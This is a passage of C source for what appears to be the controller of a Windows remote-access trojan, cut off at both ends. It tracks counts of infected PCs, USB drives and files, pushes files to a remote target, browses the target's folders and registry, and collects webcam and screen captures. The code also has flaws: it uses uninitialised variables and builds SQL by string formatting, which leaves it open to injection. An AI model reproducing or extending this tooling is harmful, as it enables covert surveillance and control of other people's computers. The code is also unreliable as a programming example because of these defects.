    SendMessage(hList7,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems*/

    //break;
}




char DLLIDDB[5], DLstatDB[5], DLLfilenameDB[255], DLLsizeDB[20], DLLusrnameDB[100], DLLdestinationDB[256], DLLtimeDB[30];


static int Downloadscallback(void *data, int argc, char **argv, char **azColName){

 //for(int i=0; i<argc; i++){

      sprintf(DLLIDDB,"%s",argv[0] ? argv[0] : "NULL");
      sprintf(DLstatDB,"%s",argv[1] ? argv[1] : "NULL");
      sprintf(DLLfilenameDB,"%s",argv[2] ? argv[2] : "NULL");
      sprintf(DLLsizeDB,"%s",argv[3] ? argv[3] : "NULL");
      sprintf(DLLusrnameDB,"%s",argv[4] ? argv[4] : "NULL");
      sprintf(DLLdestinationDB,"%s",argv[5] ? argv[5] : "NULL");
      sprintf(DLLtimeDB,"%s",argv[6] ? argv[6] : "NULL");

      ShowDloadLog(atoi(DLstatDB), DLLfilenameDB, DLLsizeDB, DLLusrnameDB, DLLdestinationDB, DLLtimeDB);

 //}

   return 0;
}


void CreateDloadLogDB(int iID, int iDLstat, char* iDLfilename, char* iDLsize, char* iDLusrname, char* iDLdestination, char* iDLtime )
{

  sqlite3 *db;
  char  *CreateDLDBtable;
  char Insertval[500];
  char Updateval[500];
  int rc;


  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

CreateDLDBtable = "create table DownloadsTable("
            "ID INT PRIMARY KEY NOT NULL,"\
            "DLstat INT,"\
            "DLfilename char(255),"\
            "DLsize char(255),"\
            "DLusrname char(255),"\
            "DLdestination char(255),"\
            "DLtime char(255));";

   iID +=1;

   sprintf(Insertval,"insert into DownloadsTable(ID,DLstat,DLfilename,DLsize,DLusrname,DLdestination,DLtime)" "values('%d', %d, '%s', '%s', '%s', '%s', '%s');",
            iID, iDLstat, iDLfilename, iDLsize, iDLusrname, iDLdestination, iDLtime);

  /* sprintf(Updateval,"UPDATE SettingTable set NotifyConn = %d, RefreshUsr = %d, AutoListen = %d, DLPathON = %d, DLPathOFF = %d, ShowDL = %d, KeepDlLog = %d, Cpass = '%s', DLPath = '%s'  where ID=0;",
           iNotifyConn, iRefreshUsr, iAutoListen, iDLPathON, iDLPathOFF, iShowDL, iKeepDlLog, iCpass, iDLPath);*/

   sqlite3_exec(db, CreateDLDBtable, 0, 0, 0);
   sqlite3_exec(db, Insertval, 0, 0, 0);
   //sqlite3_exec(db, Updateval, 0, 0, 0);

   sqlite3_close(db);

}


void GetDownloadsDatabase()
{

  sqlite3 *db;
  char *SelectVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

SelectVal = "SELECT * FROM DownloadsTable";

 sqlite3_exec(db, SelectVal, Downloadscallback, 0, 0);

 sqlite3_close(db);

}



/*void ClearDloadLog()
{

  sqlite3 *db;
  char *DeleteVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

  DeleteVal = "DELETE from Statistics where ID=1;";

  sqlite3_exec(db, DeleteVal, 0, 0, 0);

  sqlite3_close(db);


  MessageBox(hwndStat,"Log cleared","Done",MB_OK|MB_ICONINFORMATION);

}*/






char NotifyConnDB[3], RefreshUsrDB[3], AutoListenDB[3], DLPathONDB[3], DLPathOFFDB[3], ShowDLDB[3], KeepDlLogDB[3], AutoPortDB[3], ManPortDB[3], ShowULDB[3], InstanceDB[3], RefTimeDB[3], CpassDB[30], DLPathDB[256];


static int Settingscallback(void *data, int argc, char **argv, char **azColName){

      sprintf(NotifyConnDB,"%s",argv[1] ? argv[1] : "NULL");
      sprintf(RefreshUsrDB,"%s",argv[2] ? argv[2] : "NULL");
      sprintf(AutoListenDB,"%s",argv[3] ? argv[3] : "NULL");
      sprintf(DLPathONDB,"%s",argv[4] ? argv[4] : "NULL");
      sprintf(DLPathOFFDB,"%s",argv[5] ? argv[5] : "NULL");
      sprintf(ShowDLDB,"%s",argv[6] ? argv[6] : "NULL");
      sprintf(KeepDlLogDB,"%s",argv[7] ? argv[7] : "NULL");
      sprintf(AutoPortDB,"%s",argv[8] ? argv[8] : "NULL");
      sprintf(ManPortDB,"%s",argv[9] ? argv[9] : "NULL");
      sprintf(ShowULDB,"%s",argv[10] ? argv[10] : "NULL");
      sprintf(InstanceDB,"%s",argv[11] ? argv[11] : "NULL");
      sprintf(RefTimeDB,"%s",argv[12] ? argv[12] : "NULL");
      sprintf(CpassDB,"%s",argv[13] ? argv[13] : "NULL");
      sprintf(DLPathDB,"%s",argv[14] ? argv[14] : "NULL");



   return 0;
}


void CreateSettingsDatabase(int iNotifyConn,int iRefreshUsr,int iAutoListen,int iDLPathON,int iDLPathOFF,int iShowDL,int iKeepDlLog,int iAutoPort,int iManPort,int iShowUL,int iInstance,int iRefTime,char *iCpass, char *iDLPath)
{
  sqlite3 *db;
  char  *CreateSettable;
  char Insertval[500];
  char Updateval[750];
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

CreateSettable = "create table SettingTable("
            "ID INT PRIMARY KEY NOT NULL,"\
            "NotifyConn INT,"\
            "RefreshUsr INT,"\
            "AutoListen INT,"\
            "DLPathON INT,"\
            "DLPathOFF INT,"\
            "ShowDL INT,"\
            "KeepDlLog INT,"\
            "AutoPort INT,"\
            "ManPort INT,"\
            "ShowUL INT,"\
            "Instance INT,"\
            "RefTime INT,"\
            "Cpass char(14),"\
            "DLPath char(255));";




   sprintf(Insertval,"insert into SettingTable(ID,NotifyConn,RefreshUsr,AutoListen,DLPathON,DLPathOFF,ShowDL,KeepDlLog,AutoPort,ManPort,ShowUL,Instance,RefTime,Cpass,DLPath)" "values('%d', %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, '%s', '%s');",
            1, iNotifyConn, iRefreshUsr, iAutoListen, iDLPathON, iDLPathOFF, iShowDL, iKeepDlLog, iAutoPort, iManPort, iShowUL, iInstance, iRefTime, iCpass, iDLPath);

   sprintf(Updateval,"UPDATE SettingTable set NotifyConn = %d, RefreshUsr = %d, AutoListen = %d, DLPathON = %d, DLPathOFF = %d, ShowDL = %d, KeepDlLog = %d, AutoPort = %d, ManPort = %d, ShowUL = %d, Instance = %d, RefTime = %d, Cpass = '%s', DLPath = '%s'  where ID=1;",
           iNotifyConn, iRefreshUsr, iAutoListen, iDLPathON, iDLPathOFF, iShowDL, iKeepDlLog, iAutoPort, iManPort, iShowUL, iInstance, iRefTime, iCpass, iDLPath);

   sqlite3_exec(db, CreateSettable, 0, 0, 0);
   sqlite3_exec(db, Insertval, 0, 0, 0);
   sqlite3_exec(db, Updateval, 0, 0, 0);

   sqlite3_close(db);
}


void GetSettingsDatabase()
{

  sqlite3 *db;
  char *SelectVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

SelectVal = "SELECT * FROM SettingTable";

 sqlite3_exec(db, SelectVal, Settingscallback, 0, 0);

 sqlite3_close(db);

}




void InitSettings()
{

        GetSettingsDatabase();


        if(atoi(NotifyConnDB)==1)
        {
          strcpy(NotifyNewUsr,"ON");
        }

        else
        {
          strcpy(NotifyNewUsr,"OFF");
        }


        if(atoi(RefreshUsrDB)==1)
        {
          strcpy(RefreshUsers,"ON");
        }

        else
        {
          strcpy(RefreshUsers,"OFF");
        }


        if(atoi(AutoListenDB)==1)
        {
          strcpy(ListenOnStart,"ON");
        }

        else
        {
           strcpy(ListenOnStart,"OFF");
        }


        if(atoi(DLPathONDB)==1)
        {
          strcpy(isDLPathON,"ON");
        }

        else
        {
          strcpy(isDLPathON,"OFF");
        }


        if(atoi(DLPathOFFDB)==1)
        {

        }

        else
        {

        }


        if(atoi(ShowDLDB)==1)
        {
            strcpy(ShowDloadWindow,"ON");
        }

        else
        {
           strcpy(ShowDloadWindow,"OFF");
        }

        if(atoi(KeepDlLogDB)==1)
        {
            strcpy(KeepDloadLog,"ON");
        }

        else
        {
            strcpy(KeepDloadLog,"OFF");
        }


        if(atoi(AutoPortDB)==1)
        {
            strcpy(isAutoPort,"ON");
        }

        else
        {
            strcpy(isAutoPort,"OFF");
        }


        if(atoi(ShowULDB)==1)
        {
            strcpy(ShowUloadWindow,"ON");
        }

        else
        {
           strcpy(ShowUloadWindow,"OFF");
        }


        if(atoi(InstanceDB)==1)
        {
            strcpy(isOneInstance,"ON");
        }

        else
        {
           strcpy(isOneInstance,"OFF");
        }



}








static int callback(void *data, int argc, char **argv, char **azColName){
   //int i;
   //for(i=0; i<argc; i++){
      sprintf(getsockDBport1,"%s",argv[1] ? argv[1] : "NULL");
      sprintf(getsockDBport2,"%s",argv[2] ? argv[2] : "NULL");
      sprintf(getsockDBport3,"%s",argv[3] ? argv[3] : "NULL");
  // }

   return 0;
}



void SetSockDataBase(char *IP, int Port1, int Port2, int Port3)
{
  sqlite3 *db;
  char  *CreateSocktable;
  char  Insertval[300];
  char  Updateval[300];
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

CreateSocktable = "create table SockConfig("
            "ID INT PRIMARY KEY NOT NULL,"\
            "MPort INT,"\
            "UPort INT,"\
            "FPort INT);";

sprintf(Insertval,"insert into SockConfig(ID, MPort, UPort, FPort)" "values('%d', %d, %d, %d);", 1, Port1, Port2, Port3);
sprintf(Updateval,"UPDATE SockConfig set MPort = %d, UPort = %d, FPort = %d where ID=1;",Port1, Port2, Port3);

sqlite3_exec(db, CreateSocktable, 0, 0, 0);
sqlite3_exec(db, Insertval, 0, 0, 0);
sqlite3_exec(db, Updateval, 0, 0, 0);

sqlite3_close(db);

}




void GetSockDataBase()
{

  sqlite3 *db;
  char *SelectVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

SelectVal = "SELECT * FROM SockConfig";

 sqlite3_exec(db, SelectVal, callback, 0, 0);

 sqlite3_close(db);

}




static int Statscallback(void *data, int argc, char **argv, char **azColName){
   //int i;
   //for(i=0; i<argc; i++){
      sprintf(UplRateDB,"%s",argv[1] ? argv[1] : "NULL");
      sprintf(DlRateDB,"%s",argv[2] ? argv[2] : "NULL");
      sprintf(InfPCsDB,"%s",argv[3] ? argv[3] : "NULL");
      sprintf(InfUSBsDB,"%s",argv[4] ? argv[4] : "NULL");
      sprintf(InfFilesDB,"%s",argv[5] ? argv[5] : "NULL");
      sprintf(DlFilesDB,"%s",argv[6] ? argv[6] : "NULL");
      sprintf(DlSizeDB,"%s",argv[7] ? argv[7] : "NULL");
      sprintf(UplFilesDB,"%s",argv[8] ? argv[8] : "NULL");
      sprintf(UplSizeDB,"%s",argv[9] ? argv[9] : "NULL");
  // }


   return 0;
}


void GetStatsDataBase()
{

  sqlite3 *db;
  char *SelectVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

SelectVal = "SELECT * FROM Statistics";

 sqlite3_exec(db, SelectVal, Statscallback, 0, 0);

 sqlite3_close(db);

}




void SetStatsDB(int UplRate,int DlRate,int InfPCs,int InfUSBs,int InfFiles,int DlFiles,int DlSize,int UplFiles,int UplSize)
{
  sqlite3 *db;
  char *CreateStatstable;
  char Insertval[300];
  char  Updateval[300];
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

  CreateStatstable = "create table Statistics("
            "ID INT PRIMARY KEY NOT NULL,"\
            "UplRate INT,"\
            "DlRate INT,"\
            "InfPCs INT,"\
            "InfUSBs INT,"\
            "InfFiles INT,"\
            "DlFiles INT,"\
            "DlSize INT,"\
            "UplFiles INT,"\
            "UplSize  INT);";

  sprintf(Insertval,"insert into Statistics(ID,UplRate,DlRate,InfPCs,InfUSBs,InfFiles,DlFiles,DlSize,UplFiles,UplSize)"
          "values(%d,%d,%d,%d,%d,%d,%d,%d,%d,%d);",
          1,UplRate,DlRate,InfPCs,InfUSBs,InfFiles,DlFiles,DlSize,UplFiles,UplSize);

          GetStatsDataBase();

          UplRate+=atoi(UplRateDB);
          DlRate+=atoi(DlRateDB);
          InfPCs+=atoi(InfPCsDB);
          InfUSBs+=atoi(InfUSBsDB);
          InfFiles+=atoi(InfFilesDB);
          DlFiles+=atoi(DlFilesDB);
          DlSize+=atoi(DlSizeDB);
          UplFiles+=atoi(UplFilesDB);
          UplSize+=atoi(UplSizeDB);

  sprintf(Updateval,"UPDATE Statistics set ID=%d,UplRate=%d,DlRate=%d,InfPCs=%d,InfUSBs=%d,InfFiles=%d,DlFiles=%d,DlSize=%d,UplFiles=%d,UplSize=%d;",
         1,UplRate,DlRate,InfPCs,InfUSBs,InfFiles,DlFiles,DlSize,UplFiles,UplSize);


  sqlite3_exec(db, CreateStatstable, 0, 0, 0);
  sqlite3_exec(db, Insertval, 0, 0, 0);
  sqlite3_exec(db, Updateval, 0, 0, 0);

}


void CleanStatsDB()
{

  sqlite3 *db;
  char *DeleteVal;
  int rc;

  rc = sqlite3_open(DBDir, &db);
  if( rc ){

          }

  DeleteVal = "DELETE from Statistics where ID=1;";

  sqlite3_exec(db, DeleteVal, 0, 0, 0);

  sqlite3_close(db);

  ZeroMemory(&UplRateDB[0],sizeof(UplRateDB));
  ZeroMemory(&DlRateDB[0],sizeof(DlRateDB));
  ZeroMemory(&InfPCsDB[0],sizeof(InfPCsDB));
  ZeroMemory(&InfUSBsDB[0],sizeof(InfUSBsDB));
  ZeroMemory(&InfFilesDB[0],sizeof(InfFilesDB));
  ZeroMemory(&DlFilesDB[0],sizeof(DlFilesDB));
  ZeroMemory(&DlSizeDB[0],sizeof(DlSizeDB));
  ZeroMemory(&UplFilesDB[0],sizeof(UplFilesDB));
  ZeroMemory(&UplSizeDB[0],sizeof(UplSizeDB));
  RecvDataKB=0;
  SendDataKB=0;

  MessageBox(hwndStat,"Reset Complete","Done",MB_OK|MB_ICONINFORMATION);

  UpdateStats();

}



void SetSockLog(char *LSocket,char *LAction,char *LPort,char *LTime,int LStat)
{
    int Itemindex;
    char log_id[10];

    //ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockImageList, LVSIL_SMALL);

    Itemindex=SendMessage(hList8,LVM_GETITEMCOUNT,0,0);
    sprintf(log_id,"%d",Itemindex );


    LvItem.iItem=Itemindex;            // item will be put at itemIndex
    LvItem.iSubItem=0;                 // adding item, no need subitems
    LvItem.pszText="";          // set pointer to the item text
    LvItem.iImage=0;
    SendMessage(hList8,LVM_INSERTITEM,0,(LPARAM)&LvItem); // put it


    LvItem.pszText=LSocket;
    LvItem.iSubItem=1;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


    LvItem.pszText=LAction;
    LvItem.iSubItem=2;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



    LvItem.pszText=LPort;
    LvItem.iSubItem=3;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems

    LvItem.pszText=LTime;
    LvItem.iSubItem=4;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


   /* LvItem.pszText=LStatus;
    LvItem.iSubItem=5;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems*/
    ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockImageList, LVSIL_SMALL);


}


void SetSockErrorLog(char *LSocket,char *LAction,char *LPort,char *LTime,int LStat)
{

    int Itemindex;
    char log_id[10];

    //ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockErrorImageList, LVSIL_SMALL);

    Itemindex=SendMessage(hList8,LVM_GETITEMCOUNT,0,0);
    sprintf(log_id,"%d",Itemindex );


    LvItem.iItem=Itemindex;            // item will be put at itemIndex
    LvItem.iSubItem=0;                 // adding item, no need subitems
    LvItem.pszText="";          // set pointer to the item text
    LvItem.iImage=LStat;
    SendMessage(hList8,LVM_INSERTITEM,0,(LPARAM)&LvItem); // put it


    LvItem.pszText=LSocket;
    LvItem.iSubItem=1;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


    LvItem.pszText=LAction;
    LvItem.iSubItem=2;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



    LvItem.pszText=LPort;
    LvItem.iSubItem=3;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems

    LvItem.pszText=LTime;
    LvItem.iSubItem=4;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


   /* LvItem.pszText=LStatus;
    LvItem.iSubItem=5;
    SendMessage(hList8,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems*/
    ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockImageList, LVSIL_SMALL);

}



void SetDloadLog(int Dllpic, char* Dllfilename, char* Dllsize, char* Dllusrname, char* Dlldestination, char* Dlltime)
{

    GetDownloadsDatabase();
    CreateDloadLogDB(atoi(DLLIDDB), Dllpic, Dllfilename, Dllsize, Dllusrname, Dlldestination, Dlltime);

}







void ShowDloadLog(int Dllpic, char* Dllfilename, char* Dllsize, char* Dllusrname, char* Dlldestination, char* Dlltime)
{
    int Itemindex;

     ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST6),DLImageList0, LVSIL_SMALL);
     Itemindex=SendMessage(hList6,LVM_GETITEMCOUNT,0,0);

    LvItem.iItem=Itemindex;            // item will be put at itemIndex
    LvItem.iSubItem=0;                 // adding item, no need subitems
    LvItem.pszText="";          // set pointer to the item text
    LvItem2.iImage=Dllpic;
    SendMessage(hList6,LVM_INSERTITEM,0,(LPARAM)&LvItem); // put it


    LvItem.pszText=Dllfilename;
    LvItem.iSubItem=1;
    SendMessage(hList6,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


    LvItem.pszText=Dllsize;
    LvItem.iSubItem=2;
    SendMessage(hList6,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


    LvItem.pszText=Dllusrname;
    LvItem.iSubItem=3;
    SendMessage(hList6,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



    LvItem.pszText=Dlldestination;
    LvItem.iSubItem=4;
    SendMessage(hList6,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


    LvItem.pszText=Dlltime;
    LvItem.iSubItem=5;
    SendMessage(hList6,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems

    //SendDlgItemMessage(hwndFile,IDC_LIST6,TVM_SETIMAGELIST,0,(LPARAM)DLImageList0);

}






DWORD WINAPI FILEUPLOAD(LPVOID lParam)
{

    OPENFILENAME ofn;
    memset(&ofn, 0, sizeof(ofn));
    UPLfilepath[0] = '\0';
    ofn.lStructSize = sizeof(OPENFILENAME);
    ofn.hwndOwner = hwndFile;
    ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
    ofn.lpstrFile = UPLfilepath;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_PATHMUSTEXIST;


    if(GetOpenFileName(&ofn))
    {
        int Smallsize, Bigsize, Nsize;

        UPLFILE = fopen(UPLfilepath,"rb");

        ZeroMemory(&TfilepathA[0],sizeof(TfilepathA));
        ZeroMemory(&DL_Filename[0],sizeof(DL_Filename));

        lstrcpy(TfilepathA,UPLfilepath);
        GET_UPLOADFILENAME();

        lstrcpy(ULSEND.ULDestPath,FinalDir);
        lstrcpy(ULSEND.ULFname,DL_Filename);

        lstrcpy(UploadON,"ON");

        //MessageBox(NULL,ULSEND.ULDestPath,"TEST", MB_OK | MB_ICONERROR);

        fseek(UPLFILE,0,SEEK_END);
        Bigsize = ftell(UPLFILE);
        fseek(UPLFILE,0,SEEK_SET);

        Smallsize = Bigsize - Nsize;
        ULSEND.ULFLen = Smallsize;

        sprintf(ULSEND.ULFSize,"%d", ULSEND.ULFLen);

        InitSettings();

        if(strstr(ShowUloadWindow,"ON"))
        {
          CreateThread(NULL, 0,ULSTATWindow,(LPVOID)lParam, 0,0);
        }


Resend_SetFile:

        ULSEND.PacketType = SET_FUPLOAD;
        SendMessage(GetDlgItem(hwndULstat,IDC_ULPROGRESS), PBM_SETRANGE32 , 0, ULSEND.ULFLen);
        if(/*SSizeKB=*/send(FSocket[TargetID],(char*)&ULSEND,ULHeadSize,0)==SOCKET_ERROR)
        {
           // MessageBox(NULL,"UPLOAD SET ERROR","UPLOAD SET ERROR", MB_OK | MB_ICONERROR);
           goto Resend_SetFile;
        }

        UpdateStats();

        while(Nsize<Bigsize)
        {
            if(Smallsize<sizeof(ULSEND.FUload))
            {
                fread(ULSEND.FUload,1,Smallsize,UPLFILE);

Resend_File:
                ULSEND.PacketType = FUPLOAD;
                if(/*SSizeKB=*/send(FSocket[TargetID],(char*)&ULSEND,ULHeadSize,0)==SOCKET_ERROR)
                {

                    //MessageBox(NULL,"UPLOAD SEND ERROR","UPLOAD SEND ERROR", MB_OK | MB_ICONERROR);
                    goto Resend_File;
                }
                UpdateStats();
            }

            else if(Smallsize>sizeof(ULSEND.FUload))
            {

                fread(ULSEND.FUload,1,sizeof(ULSEND.FUload),UPLFILE);

Resend_File2:
                ULSEND.PacketType = FUPLOAD;
                if(/*SSizeKB=*/send(FSocket[TargetID],(char*)&ULSEND,ULHeadSize,0)==SOCKET_ERROR)
                {

                    //MessageBox(NULL,"UPLOAD SEND ERROR","UPLOAD SEND ERROR", MB_OK | MB_ICONERROR);
                    goto Resend_File2;
                }
                UpdateStats();
            }

            Nsize+=sizeof(ULSEND.FUload);
            SendMessage(GetDlgItem(hwndULstat,IDC_ULPROGRESS), PBM_SETPOS ,(WPARAM)Nsize,0 );
            Sleep(20);
        }



Send_end_File:
        ULSEND.PacketType = END_FUPLOAD;
        if(/*SSizeKB=*/send(FSocket[TargetID],(char*)&ULSEND,ULHeadSize,0)==SOCKET_ERROR)
        {
            //MessageBox(NULL,"UPLOAD END ERROR","UPLOAD END ERROR", MB_OK | MB_ICONERROR);
            goto Send_end_File;
        }
        UpdateStats();


        Sleep(1);

        SendMessage(hList2,LVM_DELETEALLITEMS,0,0);

        strcpy(SEND.Dpath,FinalDir);
        SEND.PacketType = REQ_FILES;
        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
        SendDataKB+=SSizeKB;
        SetStatsDB(SSizeKB,0,0,0,0,0,0,1,Nsize);
        UpdateStats();
        MessageBox(hwndULstat,"File Uploaded Successfully!","Upload Complete",MB_OK|MB_ICONINFORMATION);
        SendMessage(GetDlgItem(hwndULstat,IDC_ULPROGRESS), PBM_SETPOS ,(WPARAM)0,0 );
        EndDialog(hwndULstat,0);
        lstrcpy(UploadON,"OFF");
    }
}


void ONsendCam(char *ImgPart)
{
    strcat(Cam_dump,ImgPart);

}

////////////////////////////
void ONsendScreen(char *ImgPart)
{
    strcat(Screen_dump,ImgPart);
}


//char Data2[MAX_PATH];

void GET_UPLOADFILENAME()
{

    int i;
    int j;
    int k;
    char Data[MAX_PATH];
    char Data2[MAX_PATH];


    for(i=0; i<strlen(TfilepathA); i++)
    {

        if(TfilepathA[i] == '\\')
        {
            TfilepathA[i] = '/';
        }
    }
    Data[0]='\0';
    strcpy(Data, TfilepathA);

    i = strlen(Data);

    Data2[0]='\0';
    while(Data[i] != '/')
    {
        i--;
        Data2[j] = Data[i];
        j++;
    }
    i++;
    //j--;
    int x;
    for(k=(strlen(Data2)-2); k>=0; k--)
    {

        DL_Filename[x] = Data2[k];
        x++;
    }

}



int GetParentFileDir(HWND hwnd, HTREEITEM hitem, char * Buf, int ID)
{
    char A [1024] = "";
    char B [1024] = "";
    char C [1024] = "";
    int BA = 0;
    HTREEITEM hitemA;
    HTREEITEM hitemB;
//////////////////////////////////////////
    strcpy(B, C);
    strcpy(C, Buf);
    if(C[1] == ':')
    {
      strcat(C, "\\");
    }
    strcat(C, B);
    strcpy(FinalDir,C);
     //MessageBox(NULL, C, "C", MB_OK);
    if(C[1] == ':')
    {
        //strcat(C, "\\");
        strcpy(SEND.Dpath,C);
        SEND.PacketType = REQ_FILES;
        SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
        SendDataKB+=SSizeKB;
        SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
        UpdateStats();


        return 0;
    }


//////////////////////////////////////////
    hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitem);

    TreeView_EnsureVisible(hwnd,hitemA);
    SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
    flagSelected=true;
    tvi.mask=TVIF_TEXT;
    tvi.pszText=A;
    tvi.cchTextMax=256;
    tvi.hItem=hitemA;

    if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
    {
        //	MessageBox(NULL, A, "A", MB_OK);
        if(A[1] == ':')
        {
            strcat(A, "\\");
            strcpy(B, C);
            strcpy(C, A);
            strcat(C, B);
            strcat(C, "\\");
            strcpy(FinalDir,C);
            //	MessageBox(NULL, SEND.KeyPath, "A FINISH", MB_OK);
            strcpy(SEND.Dpath,C);
            SEND.PacketType = REQ_FILES;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            //MessageBox(NULL, FinalDir, "POS", MB_OK);


            return 0;

        }


        strcpy(B, C);
        strcpy(C, A);
        strcat(C, "\\");
        strcat(C, B);
        strcpy(FinalDir,C);
    }
    while(1)
    {
        switch(BA)
        {
        case 0:
            hitemB = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitemA);

            TreeView_EnsureVisible(hwnd,hitemB);
            SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemB);
            flagSelected=true;
            tvi.mask=TVIF_TEXT;
            tvi.pszText=A;
            tvi.cchTextMax=256;
            tvi.hItem=hitemB;
            if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
            {
                //	MessageBox(NULL, A, "A", MB_OK);
                if(A[1] == ':')
                {
                    strcat(A, "\\");
                    strcpy(B, C);
                    strcpy(C, A);
                    strcat(C, B);
                    strcat(C, "\\");
                    strcpy(FinalDir,C);

                    strcpy(SEND.Dpath,C);
                    SEND.PacketType = REQ_FILES;
                    SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                    SendDataKB+=SSizeKB;
                    SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                    UpdateStats();

                    //MessageBox(NULL, FinalDir, "POS", MB_OK);


                    return 0;
                    //MessageBox(NULL, A, "A", MB_OK);
                }

                strcpy(B, C);
                strcpy(C, A);
                strcat(C, "\\");
                strcat(C, B);
                strcpy(FinalDir,C);
            }

            BA = 1;
            break;

        case 1:
            hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_TREE1), hitemB);

            TreeView_EnsureVisible(hwnd,hitemA);
            SendDlgItemMessage(hwnd,IDC_TREE1,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
            flagSelected=true;
            tvi.mask=TVIF_TEXT;
            tvi.pszText=A;
            tvi.cchTextMax=256;
            tvi.hItem=hitemA;

            if(SendDlgItemMessage(hwnd,IDC_TREE1,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
            {

                if(A[1] == ':')
                {
                    strcat(A, "\\");
                    strcpy(B, C);
                    strcpy(C, A);
                    strcat(C, B);
                    strcat(C, "\\");
                    strcpy(FinalDir,C);
                    //MessageBox(NULL, FinalDir, "POS", MB_OK);


                    strcpy(SEND.Dpath,C);
                    SEND.PacketType = REQ_FILES;
                    SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                    SendDataKB+=SSizeKB;
                    SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                    UpdateStats();




                    return 0;
                }
                strcpy(B, C);
                strcpy(C, A);
                strcat(C, "\\");
                strcat(C, B);
                strcpy(FinalDir,C);

            }

            BA = 0;
            break;
        }

    }

    return 0;
}


int DeleteChild(HWND hwnd, int Control, HTREEITEM hitem)
{
    HTREEITEM Second;

    while(Second = TreeView_GetChild(GetDlgItem(hwnd, Control),hitem))
    {
        TreeView_DeleteItem(GetDlgItem(hwnd, Control),Second);
    }

    return 0;
}
//////////////////////////////////////////////////////////////////////////////////////////////////





char TreePr[MAX_PATH];

////////////////////////////////////////////////////////////////////////////////////
//Registry manager
////////////////////////////////////////////////////////////////////////////////////
//Registry manager
int AddKeyFolder(char * KeyFolder)
{
            tvinsert.hParent=RTSelected;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText=KeyFolder;
			tvinsert.item.iImage=0;
			//tvinsert.item.iSelectedImage=1;
			RTParent=(HTREEITEM)SendDlgItemMessage(hwndReg,IDC_REGTREE,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			TreeView_Select(GetDlgItem(hwndReg,IDC_REGTREE), RTSelected, TVGN_CARET);
			TreeView_Expand(GetDlgItem(hwndReg,IDC_REGTREE), RTSelected, TVM_EXPAND);
		  TreeView_Select(GetDlgItem(hwndReg,IDC_REGTREE), RTSelected, TVGN_CARET);

            strcpy(TreePr,TreeRoot);
            strcat(TreePr,"\\");
            strcat(TreePr,TreeDir);
			SendMessage(hStatus9, SB_SETTEXT, 0, (LPARAM)TreePr);


return 0;
}


int AddKeyValue(char * Name, int dtype,char * Value)
{
char Buff [1024] = "";
if(strlen(Name)==0)
{
    strcpy(Name,"(Default)");
}

    LV_ITEM	item;
	switch(dtype)
	{
	case REG_BINARY:
